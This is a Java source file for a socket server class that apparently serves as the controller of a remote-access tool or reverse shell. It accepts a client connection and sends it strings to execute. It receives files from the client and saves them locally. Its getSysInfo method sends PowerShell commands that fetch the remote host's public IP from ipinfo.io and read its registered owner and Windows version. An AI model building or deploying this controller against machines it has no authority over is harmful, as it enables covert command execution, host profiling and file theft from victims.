package connection;

import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

import org.apache.commons.io.IOUtils;

public class ServerSide {
	private Socket s;
	private ServerSocket ss;
	private DataOutputStream dout;
	private DataInputStream din;
	
	private int _port;
	
	public ServerSide(int port){
		_port = port;
	}

	public void connect() throws IOException{
		ss = new ServerSocket(_port);
		s = ss.accept();
		System.gc(); //Calls the garbage collector because of the previous function
		dout = new DataOutputStream(s.getOutputStream());
		din = new DataInputStream(s.getInputStream());
	}
	
	public String send(String str) throws IOException {
		dout.writeUTF(str);
		dout.flush();
		
		return din.readUTF();
	}
	
	public long receive(String fileName) throws IOException {
		int length = Integer.valueOf(receive());
		byte [] mybytearray  = new byte [length];
		
	    InputStream is = s.getInputStream();
	    FileOutputStream out = new FileOutputStream(new File(fileName));
	    BufferedOutputStream bos = new BufferedOutputStream(out);
	    
	    //is.read tries to read up to length, but may read less
	    int bytesRead = is.read(mybytearray, 0, length);
	    int current = bytesRead;
	    
	    System.out.println("Length: " + length);
	    System.out.println("Sent: " + current);
	    
	    while (current != length) {
	    	System.out.println("Sent: " + current);
	    	bytesRead = is.read(mybytearray, current, (length - current));
	    	if(bytesRead >= 0) {
	    		current += bytesRead;
	    	}
	    }
	    System.out.println("Sent: " + current);

	    bos.write(mybytearray, 0 , length);
	    bos.flush();
		
		return length;
	}
	
	public String receive() throws IOException {
		return din.readUTF();
	}

	public void end() throws IOException {
		dout.close();
		din.close();
		s.close();
		ss.close();
	}
	
	public boolean connectionIsOpen() {
		return !s.isClosed();
	}
	
	public String getSysInfo() throws IOException {
		String sysInfo = "[not found]";
		
		if(s.isConnected()) {
			dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
			dout.flush();
			sysInfo = "\n" + "Public ip: " + din.readUTF();
			
			dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
			dout.flush();
			sysInfo += din.readUTF();
		}
		
		return sysInfo;
	}
}
